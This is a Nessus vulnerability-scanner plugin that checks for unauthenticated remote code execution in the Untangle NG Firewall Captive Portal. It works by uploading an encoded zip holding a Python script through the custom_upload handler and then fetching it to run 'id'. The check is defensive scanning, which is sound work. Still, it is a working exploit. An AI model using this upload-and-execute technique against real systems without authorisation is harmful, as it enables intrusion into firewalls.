#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(92321);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2016/07/19 18:32:15 $");

  script_osvdb_id(141251);

  script_name(english:"Untangle NG Firewall Captive Portal RCE");
  script_summary(english:"Uploads a Python script to the server and executes it.");

  script_set_attribute(attribute:"synopsis", value:
"The Untangle NG Firewall server running on the remote host is
affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Untangle NG Firewall server running on the remote host is
affected by a remote code execution vulnerability in the Captive
Portal module, specifically within the /capture/handler.py script, due
to a failure to verify that a user is authenticated before processing
file uploads. An unauthenticated, remote attacker can exploit this to
execute arbitrary code, by uploading a crafted file and then accessing
it through an HTTP request.");
  script_set_attribute(attribute:"see_also", value:"https://blogs.securiteam.com/index.php/archives/2724");
  script_set_attribute(attribute:"solution", value:
"There is no known fix for this vulnerability at this time. To mitigate
the issue, remove the Captive Portal module.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/07/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/07/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:untangle:ng-firewall");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("untangle_ng_firewall_detect.nbin");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Untangle NG Firewall");

  exit(0);
}

include("global_settings.inc");
include("webapp_func.inc");
include("misc_func.inc");
include("audit.inc");
include("http.inc");

appname  = "Untangle NG Firewall";
get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_http_port(default:80);
get_single_install(app_name:appname, port:port);

##
# Given an appid, try to upload the python script
# @param appid: the id of the capture portal app
# @return TRUE if successful and FALSE otherwise
##
function upload_script(appid)
{
  ##
  # This python script executes and displays the results to the command
  # 'id'. This script will also delete itself to ensure that no one
  # can try to abuse it.
  ##
  local_var compressed_script =
    '\x50\x4b\x03\x04\x14\x00\x08\x00\x08\x00\x2c\x58\xed\x48\x00\x00' +
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x10\x00\x63\x75' +
    '\x73\x74\x6f\x6d\x2e\x70\x79\x55\x58\x0c\x00\xc5\x57\x86\x57\xc4' +
    '\x57\x86\x57\x8d\x00\x0f\xc4\x75\x8f\x3d\x4f\xc4\x30\x10\x44\xeb' +
    '\xf8\x57\x8c\x94\x22\x17\x21\x45\x0a\x82\x86\xeb\x10\xe2\xba\xa3' +
    '\xe0\xa3\x41\x14\xe6\xbc\xb9\xb3\xe4\xd8\xbe\xdd\xb5\x20\xff\x1e' +
    '\x07\x04\x1d\xd5\x14\xbb\xef\x8d\xa6\x6d\x4d\x8b\xa7\x93\x17\x4c' +
    '\x3e\x10\x6a\x3a\x4e\x39\x93\xc3\xfb\x82\x3d\x89\x14\x81\x8f\x48' +
    '\xec\x88\xa1\x09\x4a\xa2\x78\x78\x7c\xb9\xbb\xad\xdc\x78\x35\x5e' +
    '\x5e\x8f\xeb\xfd\x39\xaa\x8d\xc7\x50\xb1\xfd\x0e\xf7\x9e\xe9\xc3' +
    '\x86\x30\xfc\x88\xe5\xc0\x3e\x2b\xe4\x94\x4a\x70\x95\x72\x14\x48' +
    '\x6b\x95\x0a\x85\x09\x53\x62\x88\x9d\x48\x17\xe4\xc2\x39\x09\xc9' +
    '\x60\xda\xd6\xf8\x39\x27\x56\x1c\xd2\x3c\xdb\xe8\xc4\x18\x47\x53' +
    '\x6d\x72\xf4\xb9\x61\x3a\xf7\x37\xa6\xf9\x33\xad\x1e\xd3\xfc\x7e' +
    '\x0e\x47\x52\x51\xab\x45\x52\xd1\x5c\x74\xd3\xf1\x8c\x0e\x17\xa8' +
    '\xd8\xb0\x8e\x8c\x76\xa6\x7e\x6b\xbe\x05\x5e\x72\xb0\x0b\xbc\x33' +
    '\x0d\x93\x16\x8e\xf8\x5f\xe3\x5d\xd7\xbf\x8e\x6f\x5b\xf3\x05\x50' +
    '\x4b\x07\x08\x70\x7e\x1a\xed\xd8\x00\x00\x00\x34\x01\x00\x00\x50' +
    '\x4b\x01\x02\x15\x03\x14\x00\x08\x00\x08\x00\x2c\x58\xed\x48\x70' +
    '\x7e\x1a\xed\xd8\x00\x00\x00\x34\x01\x00\x00\x09\x00\x0c\x00\x00' +
    '\x00\x00\x00\x00\x00\x00\x40\xa4\x81\x00\x00\x00\x00\x63\x75\x73' +
    '\x74\x6f\x6d\x2e\x70\x79\x55\x58\x08\x00\xc5\x57\x86\x57\xc4\x57' +
    '\x86\x57\x50\x4b\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\x43\x00' +
    '\x00\x00\x1f\x01\x00\x00\x00\x00';

  local_var payload = '------WebKitFormBoundary01qMhcrziA5ZSsfA\r\n' +
            'Content-Disposition: form-data; name="upload_file"; filename="custom.zip"\r\n' +
            'Content-Type: application/zip\r\n\r\n' +
            compressed_script + '\r\n' +
            '------WebKitFormBoundary01qMhcrziA5ZSsfA\r\n' +
            'Content-Disposition: form-data; name="appid"\r\n\r\n' +
            appid + '\r\n' +
            '------WebKitFormBoundary01qMhcrziA5ZSsfA\r\n' +
            'Content-Disposition: form-data; name="filename"\r\n\r\n' +
            'nessus_attack.py\r\n' +
            '------WebKitFormBoundary01qMhcrziA5ZSsfA--\r\n';

  local_var url = "/capture/handler.py/custom_upload";
  local_var up = http_send_recv3(
    method:'POST',
    port:port,
    item:url,
    content_type:'multipart/form-data; boundary=----WebKitFormBoundary01qMhcrziA5ZSsfA',
    data:payload,
    exit_on_fail:TRUE);

  if (isnull(up) || "200 OK" >!< up[0]) return FALSE;
  return '{success:true' >< up[2];
}

# We need to know the application ID of the capture portal, but
# this is not advertised. Luckily they are sequential. The
# securiteam write up indicates that app ids 1-35 are valid
# so we'll just try 'em all.
for (i = 0; i < 36; i++)
{
  if (upload_script(appid:i) == TRUE)
  {
    payload_url = '/capture/custom_' + i + '/custom.py';
    res = http_send_recv3(
      method:'GET',
      port:port,
      item:payload_url,
      exit_on_fail:TRUE);

    # if this fails I think marking this as unaffected is fine.
    if (isnull(res) || "200 OK" >!< res[0]) audit(AUDIT_WEB_SERVER_NOT_AFFECTED, port);

    # verify that this is in the form of 'id' like we'd expect
    if ('uid' >!< res[2] || 'gid' >!< res[2]) audit(AUDIT_WEB_SERVER_NOT_AFFECTED, port);

    security_report_v4(
      port:port,
      severity:SECURITY_HOLE,
      request:make_list(get_host_ip() + ':' + port + payload_url),
      cmd:'id',
      output:chomp(res[2]));
      exit(0);
  }
}

audit(AUDIT_WEB_SERVER_NOT_AFFECTED, port);
